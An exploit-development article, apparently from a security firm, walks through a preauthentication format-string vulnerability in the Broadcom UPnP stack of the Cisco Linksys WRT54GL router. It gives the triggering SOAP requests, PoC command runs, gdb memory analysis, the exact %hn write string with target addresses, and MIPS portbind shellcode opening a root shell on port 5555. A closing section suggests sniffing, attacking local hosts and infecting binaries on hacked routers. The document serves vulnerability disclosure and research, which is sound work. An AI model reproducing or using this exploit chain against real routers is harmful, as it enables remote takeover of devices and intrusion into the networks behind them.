===[ 1. Introduction

Hacking network devices is a sort of the Holy Grail for hackers, because
once we're in a network device like a router or switch, we can (more-or-less)
overtake all machines behind it. 
Network traffic sniffing, man-in-the-middle attacks, binary infection 
on-the-fly, further network penetration, so on, and so on... 
Hell, you can even play games on someone's router if you want. :)

A few months ago I've stumbled across a very interesting remote preauthentication
code execution vulnerability in a very popular Cisco Linksys router, present in 
default installation. 
Vulnerability itself was initially located in Cisco Linksys WRT54GL model.
According to data available on the internet, Cisco Linksys WRT54GL
alone was sold >20M worldwide. 

At first, that seemed like immense and very interesting playground - 
and vulnerability that definitely deserves attention. 
To make it even funnier, later it turned out that other Cisco Linksys 
models are vulnerable, and even more - many other router models from other 
manufacturers are also affected by the very same vulnerability.
Just to name a few: ASUS, D-Link, Zyxel, US Robotics, TP-Link, Netgear, etc. 
Full vulnerable vendor list reference is present at the end of the article.
During the further vulnerability analysis and data provided by HD Moore (thanks;) of 
Metasploit/Rapid7, it turned out that there are at least 15M vulnerable routers
visible (hackable;-) directly from the internet. Probably many more in local
networks and wireless hotspots.

Hacking embedded devices like routers is always funny, basically because they're 
designed as closed Black-Box systems for specific purpose. 
Interesting thing for embedded devices is that a very small percent of users will
ever actually upgrade (flash) their routers with new firmware when some 
vulnerability is discovered, no matter how dangerous the vulnerability is.
That said, I think it's safe to assume that years after this article, there will
still be many vulnerable routers out there. 

In the following article, we will show you how to remove the shroud of Black-Box 
mist from router devices like that, and even more - to have some fun while doing 
that. Join us on "From Zero To ZeroDay" journey...



===[ 2. Vulnerability background 

When some vulnerability is present across multiple router models from various router 
manufacturers, logical assumption is that the vulnerable component itself is developed by 
a third party.
Remote preauth vulnerability we'll discuss in this article is present in the UPnP 
protocol implementation originally developed by Broadcom Company and distributed by 
many router manufacturers (full vulnerable vendor list at the end). 
UPnP stands for Universal Plug and Play protocol. 

Brief description:
"Universal Plug and Play (UPnP) is a set of networking protocols that permits 
networked devices, such as personal computers, printers, Internet gateways, Wi-Fi access points
and mobile devices to seamlessly discover each other's presence on the network and establish 
functional network services for data sharing, communications, and entertainment."

So basically, UPnP is designed to connect all your computers, gadgets, TV's, Microwave 
Ovens and Refrigerators together. Almost all popular SOHO routers will support 
UPnP nowadays, and in most cases, UPnP is turned on by default on them.

For start, there are couple of major design flaws within the UPnP protocol and
its implementations. 
First of all - it doesn't require any form of authentication, and second - many UPnP 
implementations will accept requests directly from the WAN interface.
In a modern, interconnected world, any little bit more complex protocol that doesn't support 
any sort of authentication is a self-sufficient bad idea, but when implementations of protocol
like that also listen on WAN interface by default, it's a sort of a time-bomb anxiously 
waiting to go off.

Another interesting thing about UPnP is that the protocol itself is (comparing to other
popular internet protocols) relatively new, because it was introduced in the late 90's.
That's why UPnP protocol and its implementations deserve attention from security perspective.

Over the time, various flaws were discovered in different UPnP protocol implementations.

In 2001 - eEye discovered critical vulnerabilities in Microsoft UPnP implementation
In 2006 - Various UPnP IGD implementation defects disclosed by Armijn Hemel
In 2008 - GNUcitizen abused Adobe Flash to reconfigure routers with UPnP
In 2011 - Security researcher Daniel Garcia exploited the flaw in some UPnP IGD
          implementations on devices that allows UPnP requests on WAN.
In 2013 - DefenseCode discloses Broadcom UPnP implementation remote preauth code 
		  execution in various router devices (described in this article)
In 2013 - HD Moore of Rapid7 discloses Multiple UPnP vulnerabilities in various 
		  router devices

In the following sub-chapters, we will present specification and technical description
of our target - Cisco Linksys WRT54GL router (know your enemy, right?:-), along with some basic 
UPnP protocol specification. 




===[ 2.1 Know Your Enemy - Cisco Linksys WRT54GL 

Later in the article we will describe how to gain remote shell on Cisco Linksys wireless router 
- WRT54GL model, but be patient, young Jedi. First, let's see what is inside the box, just to know 
what we're dealing with.
Cisco Linksys WRT54GL is a very popular Wi-Fi capable broadband router originally developed by Cisco 
Linksys. 
WRT54GL model comes in two hardware versions - 1.0 and 1.1 with basically the same hardware
specification. Our focus is on hardware version 1.1, with default firmware version - 4.30.7.

===[ 2.2 UPnP brief history and protocol basics

Protocol descriptions can be somewhat dull and boring, and to be honest I wasn't thrilled 
when I had to write this chapter. I've included it solely because UPnP itself is really 
kinda "messed-up", so maybe it's not a bad idea to have some basic concepts included.
If this is your first real encounter with UPnP, I suggest reading, otherwise skip it.

As stated earlier, Universal Plug and Play (UPnP) protocol was introduced in late 90's.
A few different vendors were working on their own solutions for creating a protocol 
whose purpose would be easier network devices and applications management. 

UPnP predecessor, or better say, distant cousin was Sun's Jini, introduced in 1998. 
Sun's Jini was developed with management purpose for co-operation between services of 
distributed systems.
Somewhat later Microsoft stepped forward with UPnP protocol. 
UPnP protocol is based on a few popular internet protocols and technologies like IP, TCP, 
UDP, HTTP, and XML.

UPnP protocol stack implementation has 6 layers, of which the first one (addressing) is 
optional. 

UPnP stack layers:
0. Addressing
1. Discovery
2. Description
3. Control
4. Eventing
5. Presentation

A short description of UPnP protocol layers is presented below (if you're too lazy to read a more
detailed description):

- Addressing   - UPnP device will obtain IP through DHCP or Auto-IP
- Discovery    - UPnP capability to discover other devices on the network
- Description  - XML file that will describe UPnP services 
- Control      - How to command other UPnP device or program to do something
- Eventing     - "State variables" for UPnP-enabled device or program states
- Presentation - User interface


===[ 2.2.1 Addressing (optional)

Default behavior of devices with UPnP support is to get IP address through DHCP 
(Dynamic Host Configuration Protocol) if possible. According to the UPnP protocol 
specification, UPnP device which does not implement DHCP server itself must include DHCP client, 
and search for DHCP server when the device is first connected to the network.
If a DHCP server is available, device must use IP address assigned to it.
If DHCP server is not available, device must use automatic IP addressing (Auto-IP)
to obtain and address. Auto-IP is defined in RFC 3927.


===[ 2.2.2 Discovery

When the UPnP-enabled device is connected to the network, it will send out a Discovery 
message over the UDP (User Datagram Protocol) to the multicast address 239.255.255.250 on the
UDP port 1900. Discovery protocol itself is named SSDP (Simple Service Discovery Protocol),
and is very similar to the HTTP (Hyper Text Transfer Protocol).
SSDP discovery message purpose is to discover other UPnP-enabled devices available on the
network.

Start line of the SSDP protocol must be one of these:

1. NOTIFY * HTTP/1.1\r\n
2. M-SEARCH * HTTP/1.1\r\n
3. HTTP/1.1 200 OK\r\n

One standard SSDP request sent to the multicast address is presented below:

M-SEARCH * HTTP/1.1
HOST: 239.255.255.250:1900
MAN: ssdp:discover
MX: 10
ST: ssdp:all

UPnP-enabled devices on the network are supposed to reply to the 'Discovery' requests
with response similar to this:

HTTP/1.1 200 OK
CACHE-CONTROL:max-age=1800
EXT:
LOCATION:http://10.0.0.138:80/IGD.xml
SERVER:SpeedTouch 510 4.0.0.9.0 UPnP/1.0 (DG233B00011961)
ST:urn:schemas-upnp-org:service:WANPPPConnection:1
USN:uuid:UPnP-SpeedTouch510::urn:schemas-upnp-org:service:WANPPPConnection:1

See all those "special characters" in request and response? Many UPnP implementations 
will parse and tokenize them in interesting ways... Speaking of where to look for 
overflows... :)


===[ 2.2.3 Description

Response for the 'Discovery' message contains LOCATION header. Location header contains
URL where the service profile is located. Profile itself is a XML format file.
In previous case, it's http://10.0.0.138:80/IGD.xml. XML profile will contain control URL's
where later described control and eventing phase can send commands to.


===[ 2.2.4 Control

In control layer, a UPnP-enabled device or program can send commands to another UPnP-enabled
device or program in order to perform some task previously described in a profile description
XML file. Communication is driven using SOAP (Simple Object Access Protocol).
Particular service described in profile XML file can be requested by sending a SOAP request
to the specific control URL with adequate parameters. 


===[ 2.2.5 Eventing

UPnP has state variables which purpose is to keep some state of UPnP devices and programs.
Another UPnP-enabled device or program can subscribe to the device state variables of 
UPnP-enabled device. When state is changed, the new state is sent to all subscribed
UPnP-enabled devices or programs.


===[ 2.2.6 Presentation

Presentation layer stands for user interface, no further description needed.





===[ 3. Vulnerability details

As we previously said, the vulnerability is located in Broadcom UPnP stack, used
in Cisco Linksys WRT54GL, and in many other router models from other vendors.
The vulnerability itself is present in IGD (Internet Gateway Device) module of
a Broadcom UPnP stack. 

Vulnerable piece of code can be called through SetConnectionType and 
GetConnectionTypeInfo functions of 'wanipc' and 'wanppp' modules. 
It can be reached with a single SOAP request for SetConnectionType function.
The vulnerability is very interesting because it is a classic Format String bug,
that can be exploited to remotely read or write memory on vulnerable router 
devices (without prior authentication).
Format string vulnerability is present in all Cisco Linksys WRT54GL 
firmware versions up to (and included) - 4.30.15.

In this article, we will assume that you already know what a format string
vulnerability is, and how it can be exploited. For newcomers, detailed
description of format string bugs can be found on 
http://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf.

Format string vulnerability is present because user-input value from SOAP request is 
supplied as a format string argument to the snprintf() function in files wanipc.c 
and wanpp.c. Vulnerable code lines are located in the following files and code lines

/upnp/igd/wanipc.c:
-------------------
static int SetConnectionType(UFILE *uclient, PService psvc, PAction ac,
pvar_entry_t args, int nargs) {

snprintf(psvc->vars[VAR_ConnectionType].value, sizeof(psvc->vars[
VAR_ConnectionType].value), ac->params[0].value);  <------ HERE

return TRUE;

}
-------------------


/upnp/igd/wanppp.c:
-------------------
int WANPPPConnection_SetConnectionType(UFILE *uclient, PService psvc,
PAction ac, pvar_entry_t args, int nargs)
/* "SetConnectionType", WANPPPConnection_SetConnectionType, */
{

snprintf(psvc->vars[VAR_ConnectionType].value, sizeof(psvc->vars
[VAR_ConnectionType].value), ac->params[0].value);  <------ HERE

return TRUE;

}
-------------------

Vulnerability itself can be reached with a single SOAP request that calls
SetConnectionType function as presented below. 

SetConnectionType:
-------------------
<?xml version="1.0"?>
<SOAP-ENV:Envelope...>
<SOAP-ENV:Body>
<m:SetConnectionType
xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1" as="">
<NewConnectionType> #FORMAT_STRING# </NewConnectionType>
</m:SetConnectionType>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
-------------------


Format string output is available through GetConnectionTypeInfo SOAP 
request.

GetConnectionTypeInfo:
----------------------
GetConnectionTypeInfo:
<?xml version="1.0"?>
<SOAP-ENV:Envelope...>
<SOAP-ENV:Body>
<m:GetConnectionTypeInfo
xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">
</m:GetConnectionTypeInfo>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
----------------------

For start, in the following chapter, we will show you how to reach vulnerable code 
with a simple proof of concept exploit.




===[ 4. Basic Proof Of Concept Exploit

Like most researchers out there, whenever I'm developing some exploit, prior to any 
serious steps I will try to write a PoC exploit just to verify the vulnerability.
Cisco Linksys WRT54GL UPnP SOAP service is listening on TCP port 5431, so all 
requests from our PoC exploit will be sent to that port. Also worth mentioning is 
that router's UPnP service is running under the root account.
To reach format string bug itself, we will use two different SOAP requests for SetConnectionType
and GetConnectionTypeInfo actions.
SetConnectionType will be used for setting the format string and GetConnectionTypeInfo method
for reading the format string output.

It is also important to mention that appropriate UUID must be set in POST requests for SOAP service. 
In case of Cisco Linksys WRT54GL (version 4.30.7), UUID is 586d-8fd8-04f5020099dc.


SOAP Requests will be formed as presented below.

1. SetConnectionType (HTTP)
   - SOAP header SOAPAction for SetConnectionType
      - urn:schemas-upnp-org:service:WANIPConnection:1#SetConnectionType
   - XML with <NewConnectionType>#FORMAT_STRING#</NewConnectionType>

2. GetConnectionTypeInfo (HTTP)
   - SOAP header SOAPAction for GetConnectionTypeInfo
      - urn:schemas-upnp-org:service-1-0:WANIPConnection:1#GetConnectionTypeInfo
   - XML with <m:GetConnectionTypeInfo></m:GetConnectionTypeInfo>
     

Just to mention, vulnerable UPnP IGD network stack will respond with 
"Server" HTTP header like - "LINUX/2.4 UPnP/1.0 BRCM400/1.0".

PoC exploit source code is attached at the end of the file. This simple PoC
will only take one argument (format string to set). Just to mention -  
router's IP address is hardcoded into the PoC exploit source (192.168.1.1 default)

Let's try it now...

Ok, now we're getting somewhere. In the response above, you will see router
memory addresses, so we can use this interesting format string bug to read 
router's memory. Let's try some more...


[root@defensecode linksys]# python cisco_linksys_poc.py _%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x

bd8_10009190_0_1000056c


We're definitely getting somewhere... 
Now let's try to crash the service itself with "%n" format string.


[root@defensecode linksys]# python cisco_linksys_poc.py %n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n
> Cisco Linksys WRT54GL Remote Preauth 0day PoC
> Leon Juranic <leon@defensecode.com>

> Cannot connect to the target port...

Ok, so now we know that we can use this vulnerability to crash Cisco Linksys WRT54GL 
UPnP SOAP service. Router has to be restarted to start the UPnP service again...
However, that's not really interesting to us. We're heading towards that magic '#' 
character - the root shell :)

Our next step is full exploit development for the router. 
We all know that for exploit development process, debugger is a must-have tool,
otherwise, you'll walk in the dark for a long time - but that's especially true when 
you're hacking some "obscure" embedded device. 

For some time I have been thinking about how this exploit could be developed without a debugger, 
just by using the remote memory read feature of format string bug, but it's not all 
that easy, and it would be a waste of time (even just to confirm that it's too hard to do).
So, our next logical step is setting up a debugging environment for our target router,
with the whole process described in the next chapter.




===[ 5. Debugging Environment

Debugging embedded devices is not exactly easy as debugging local programs. In fact,
it can be much more complicated, or better say... time-consuming and annoying.

First you need to buy hardware for serial port access, then you need to open your router up and 
connect the serial interface to it, then you need to cross-compile debugging tools and also 
upload them to the router for the purpose of debugging. 

Debugging environment setup is described in the following chapters.



===[ 5.1 Required Hardware 

EIA standard RS-232-C, or more popular "serial port" dates from the 1960s.
It is used to connect two devices and exchange binary data and control signals between them. 
Over the last decade or two it's being surpassed by USB due to its (RS232C) low transmission 
speed, large voltage swing, and large connectors.

Nevertheless it is still being used in equipment like network devices, as it is the case in 
our Cisco Linksys WRT54GL. 
Here it can be used to access the boot loader and shell which is not accessible over the network 
interface. 

However, this router port is not exposed to the outside world, but only as a placeholder 
of 2 rows of 5 soldering points on the circuit board of the device. Besides not being physically 
exposed to the outside, its voltages are not quite the ones dictated by the standard, so a little 
electronic circuit is required in order to interface the low circuit board serial port voltage 
(3.3V) to the one expected by the computer serial port. If the computer which connects to the 
router over serial port doesn't actually have a serial port, a USB-to-serial is needed.

There are actually two serial ports on the circuit board of the Linksys router. The holes 
locations are indicated on the image below with "SERIAL PORTS" together with pin numbering, 
and the pinout is as follows:

  Serial port 1 (ttyS0)
  2 - Vcc 3.3V
  4 - Tx 0
  6 - Rx 0
  8 - n/c
 10 - GND

  Serial port 2 (ttyS1)
  1 - Vcc 3.3V
  3 - Tx 1
  5 - Rx 1
  7 - n/c
  9 - GND

It is best to solder a pin header for the serial ports and avoid further
soldering iron contact with the sensitive PCB. The voltage levels adapter used for 
debugging was a cheap one ($15) from ebay which had a pin header with Tx,Rx,GND,Vcc 
labels and 4 wires which easily attach to the soldered pin header. I'm sure you can get 
one in your favorite hackterial store. 

Chip in the adapter that does the "voltage magic" is usually labeled similar to the 
one first created by Maxim Integrated Products, named "MAX232".
Is it necessary mentioning that opening the case and soldering things to the device
will void the warranty?



===[ 5.2 Required Software

When appropriate hardware is installed, we need some program for serial port 
communication, because we will have to connect to the router's console.
You can use 'minicom' or 'screen', or whatever else you prefer, as long as it is 
suitable for remote serial console communication. Baud rate for Cisco Linksys 
WRT54GL serial console should be set to the 115200 bit/s, otherwise you will get 
garbage output from the console.

Once we're connected to the router serial console, we will have local
root access on router as presented below:

For detailed debugging, we will use gdb server cross-compiled for MIPS(LE)
architecture and gdb compiled with MIPS(LE) support. LE suffix stands for 
Little Endian.

The crucial step is cross-compiling essential tools (like gdb, nc, etc) 
in order to have basic environment for exploitation.

There are various pre-made cross-compiling toolchains to help in
cross-compiling. You can just google for "cross compiling toolchains"
and you will find a lot of tools. Good ones include CodeSourcery,
Scratchbox, and Buildroot.

Since we only needed a few tools, buildroot was our toolchain of
choice. It can be downloaded from: http://buildroot.uclibc.org/ and
everyone who have compiled Linux kernel or openwrt (for example) themselves, 
would find their way around toolchain quickly.

We have used gdb version 6.8 since it is easier for cross-compiling than
a newer version. Since embedded architectures are usually limited
in resources, gdb has a nice feature to only have small binary called gdbserver 
on embedded device and have full blown gdb on desktop. 
Cross compiling and statically building gdbserver is straightforward. 

Afterwards, you can just run gdbserver on target device and run gdb on 
desktop/laptop PC telling gdb to connect to gdbserver in
order to perform remote debugging (there is also some good gdb documentation
on this topic if you are not familiar with this process).




===[ 5.3 Debugging

In this chapter we'll demonstrate UPnP service debugging. First, we will start gdbserver on 
router device and attach it to the UPnP service. Afterwards, we will run gdb debugger on our
desktop/laptop computer, and connect it to the remote gdbserver debugging session.
gdb client will be connected from the IP address 192.168.58.129, and gdbserver service
will listen on port 5000. UPnP process PID is in this case 69.

Following commands are issued on the router device via the serial console:

# ps aux
...
   69 0         S    upnp -D -L br0 -W vlan1 -S 0 -I 60 -A 180
...

# ./gdbserver --attach 192.168.58.129:5000 69
Attached; pid = 69
Listening on port 5000
Remote debugging from host 192.168.1.100


When everything is set, we will run the following command (target remote 
192.168.1.1:5000) on the gdb client side.

Continuing.

Ok, we have active gdb debugging session with UPnP service on our Cisco Linksys
WRT54GL router. Now we can move on to the real thing...




===[ 6. Pieces for the exploit

We have everything ready for the magic now...
It is assumed that dear reader is familiar with format string vulnerability exploitation 
technique, so no details about it will be given here.

That said, first steps in exploitation process is to discover where is our input located 
in the memory. Later, we will use that for "%n" format string write ability, 
to overwrite arbitrary memory locations, and to gain the control of PC register.

In the following example, previously introduced PoC exploit will be used to crash UPnP 
service, and analyze memory environment.

[root@defensecode linksys]# python cisco_linksys_poc.py %n%n%n%n%n%n%n%n
> Cisco Linksys WRT54GL Remote Preauth 0day PoC
> Leon Juranic <leon@defensecode.com>

When PoC exploit is started, our gdb debugging session will be interrupted 
with segmentation fault.
If we examine SP register, we will see that our input (or better say SOAP XML
request) is located above the memory address where SP points.

(gdb) c
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x2ac10680 in ?? ()
(gdb) i r sp
sp: 0x7fff7820
(gdb) x/s $sp
...
...
0x7fff7bd7:     ""
(gdb)
0x7fff7bd8:     "</m:SetConnectionType"
(gdb)
0x7fff7bee:     "nfo"


On the memory address 0x7fff7bd8, there is a part of our input - closing of SetConnectionType. 
That should be enough for us to obtain write-4-anywhere primitive through the format string
("%hn" type). 
It is important to mention that Cisco Linksys WRT54GL is using uClib 
(C library developed for the embedded Linux systems). Less fortunate thing about uClib is that 
it doesn't support format string '$' feature that can be used for direct memory parameter access. 
So, it will be necessary to perform stack-pops until our input is reached.

Now we know where our input can be found, let's try to put something there that we 
can control.
We will change payload for our GetConnectionTypeInfo SOAP request and add some custom data to it,
as presented below:

---
<?xml version="1.0"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope" 
SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>AAAAAAAAAAAAAAAAAAAAAA
	<AAAABBBBCCCCEEEEFFFFGGXXXXAAAAAAAAXXXXIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPRRRRSSSSTTTTUUUU>
	<m:GetConnectionTypeInfo xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">

	</m:GetConnectionTypeInfo>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
---


Let's try the PoC exploit again with new payload. This PoC will only call 
GetConnectionTypeInfo function.

[root@defensecode linksys]# python cisco_linksys_exploit.py %u
> Cisco Linksys WRT54GL Remote Preauth 0day PoC
> Leon Juranic <leon@defensecode.com>

> Received '<?xml version="1.0"?>\r\n<s:Envelope xmlns:s="http://schemas.xmlsoap

onnectionTypes>Unconfigured,IP_Routed,IP_Bridged</NewPossibleConnectionTypes></m
:GetConnectionTypeInfoResponse></s:Body></s:Envelope>\r\n'
> FMT: IP_Routed


Memory content after modified PoC exploit execution is presented below.

(gdb) x/s 0x7fff7bd4
0x7fff7bd4:     "\rT"
(gdb)
0x7fff7bd7:     ""
(gdb)
0x7fff7bd8:     "</AAAABBBBCCCCEEEEFFFFGGXXXXAAAAAAAAXXXXIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPRRRRSSSST"
(gdb)
0x7fff7c28:
(gdb)
0x7fff7c2b:     "\020=\224"


Now we have controllable input that can be used as memory address reference for 
arbitrary memory overwrite with "%hn" format string.
To verify that we really have write-4-anywhere primitive, we will now again
modify the PoC exploit, and again re-introduce the call to SetConnectionType with %hn 
(%n half-write).

Format string itself is formatted as presented below (python):
---
sendfmt = "%u" * 82 + "%.u%hn" + "%.u%.u%hn" 
---

After executing modified PoC exploit with a new format string and controllable
input, we will again get segmentation fault, as presented below.

Program received signal SIGSEGV, Segmentation fault.

(gdb) x/i $pc
=> 0x2ac1068c:  sh      a2,0(a0)

Program will crash at 'sh a2,0(a0)' instruction. If we check MIPS architecture manual,
sh instruction is pretty straightforward:
---
sh Rsrc1, imm(Rsrc2): Store Halfword
Store the lower 16 bits (halfword) of register Rsrc1 into memory address Rsrc2 + imm.
---
http://www.ece.umd.edu/~manoj/759M/MIPSALM.html

Basically, it will try to write halfword of the 'a2' register to the memory address
contained in 'a0' register. If we check 'a0' register value - it is 0x58585858, and
that is exactly the value of the "XXXX" ASCII string from our previously introduced input.
That said, we can write 2 bytes anywhere in the memory. Repeat that once again,
and we have write-4-anywhere primitive. Game over.

To gain control of the PC register, we will overwrite RET address at the 0x7fff7ab4
with the address of our shellcode.




===[ 7. PC register takeover

Now we know stack-pop offset where our input is located, and return address that 
should be overwritten for PC (Program Counter) register takeover.
PoC exploit format string is (in python): "%u" * 82 + "%.u%hn" + "%.u%.u%hn"

Format string argument itself for the previously introduced format string will be sent 
as presented below:
---
<AAAABBBBCCCCEEEEFFFFGG''' + write_one + '''AAAAAAAA''' + write_two + '''IIJJJJKKKK
LLLLMMMMNNNNOOOOPPPPRRRRSSSSTTTTUUUU>
---
- write_one is 0x7fff7ab6
- write_two is 0x7fff7ab4


Before any further steps, we will set breakpoint on the previously mentioned 'sh'
half-write instruction (address 0x2ac1068c), so we can track what is written and 
where.


(gdb) x/i $pc-4

So, there are two rounds of writing, first to the 0x7FFF7AB6 and second to the 0x7FFF7AB4.
The next step is to find complete SOAP SetConnectionType request in the memory, because that is 
the place where our shellcode will be included, and later we will redirect code execution to 
that address.

MIPS shellcode itself will not be discussed in this article, because it is a whole different 
subject. In this case, we will use MIPS /bin/sh portbind shellcode that will bind shell 
to the TCP port 5555.

MIPS portbind (TCP 5555) shellcode is presented below.

mipsshellcode = "\xe0\xff\xbd\x27\xfd\xff\x0e\x24\x27\x20\xc0\x01\x27\x28\xc0" +
	        "\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01\x01\x01\x50\x73" +

		"\x73\x0f\x24\x25\x20\x10\x02\x01\x01\x05\x24\x4e\x10\x02\x24" +
		"\x0c\x01\x01\x01\x50\x73\x0f\x24\x25\x20\x10\x02\xff\xff\x05" +
		"\x28\xff\xff\x06\x28\x48\x10\x02\x24\x0c\x01\x01\x01\x50\x73" +

		"\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68" 


Our next step is to modify SetConnectionType XML request and add shellcode to it,
as presented below.

---
SETSOAPREQ = '''<?xml version="1.0"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
       <m:SetConnectionType xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1" as ="''' 
       
       + mipsshellcode +                  
       
       '''">
	<NewConnectionType>%s</NewConnectionType>
       </m:SetConnectionType>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>'''
---

Now, let's find where our SOAP request and shellcode is located in the memory. 
The easiest way to find it without much effort is to inspect current registers, and 
memory space around their values upon program crash.
Within few minutes, we have located our shellcode 

(gdb) x/100c 0x1000f1bf
0x1000f1bf:     58 ':'  115 's' 101 'e' 114 'r' 118 'v' 105 'i' 99 'c'  101 'e'

0x1000f1cf:     110 'n' 110 'n' 101 'e' 99 'c'  116 't' 105 'i' 111 'o' 110 'n'
0x1000f1d7:     58 ':'  49 '1'  34 '"'  32 ' '  97 'a'  115 's' 61 '='  32 ' '
0x1000f1df:     34 '"'  
...
(gdb) x/50x 0x1000f1e0 <- SHELLCODE!!!!!!!
0x1000f1e0:     0xe0    0xff    0xbd    0x27    0xfd    0xff    0x0e    0x24
0x1000f1e8:     0x27    0x20    0xc0    0x01    0x27    0x28    0xc0    0x01
0x1000f1f0:     0xff    0xff    0x06    0x28    0x57    0x10    0x02    0x24
0x1000f1f8:     0x0c    0x01    0x01    0x01    0x50    0x73    0x0f    0x24
0x1000f200:     0xff    0xff    0x50    0x30    0xef    0xff    0x0e    0x24
0x1000f208:     0x27    0x70    0xc0    0x01    0x15    0xb3    0x0d    0x24
0x1000f210:     0x04    0x68
...

That's it. Now we have all important data for the exploit construction.
Memory address that will be overwritten - 0x7FFF7AB4 
Memory address of the shellcode - 0x1000F1E0.
All that's left now is to construct appropriate format string write, and that's it.
We're ready to go.





===[ 8. Gaining control over the router

All that's left now is to write right values to the return address memory location
(0x7FFF7AB4), and that's it. Location of our shellcode is 0x1000F1E0, so we will
construct our format string for two writes -  0x1000 to the 0x7fff7ab6 and 0xF1E0
to the 0x7fff7ab4.
Details are presented below.

Two half-writes are used:
- write_one is 0x7fff7ab6 <- 0x1000
- write_two is 0x7fff7ab4 <- 0xF1E0

In other words, this:

sendfmt = "%u" * 82 + "%.3545u%hn" + "%.28988u%.28836u%hn"

So, exploit process step by step is this:
---
1. Send "Prestage" GetConnectionType request with addresses for two
   half-writes (0x7fff7ab6 and 0x7fff7ab4)
2. Prepare SetConnectionType request with shellcode included
3. Trigger the format string vulnerability that will overwrite return 
   address at the 0x7fff7ab4 with 0x1000F1E0, because there is our 
   portbind shellcode
4. Connect to the router port 5555 port to obtain shell access
---

Now we will try our new Cisco Linksys WRT54GL exploit on the router along with the
gdb output step by step.

That's it. We have obtained root shell on Cisco Linksys WRT54GL router.




===[ 9. Post-intrusion fun

Now you can do anything that you want on the router. Install some sniffer,
attack other computers in local network, infect binaries transmitted over the
network, or play ncurses version of space invaders.
Like for example - basic ncurses space-invaders like game that I coded just for 
fun 10 years ago. Cross-compile the game, upload to the hacked router and you can play 
space-invaders on someone's router. :)
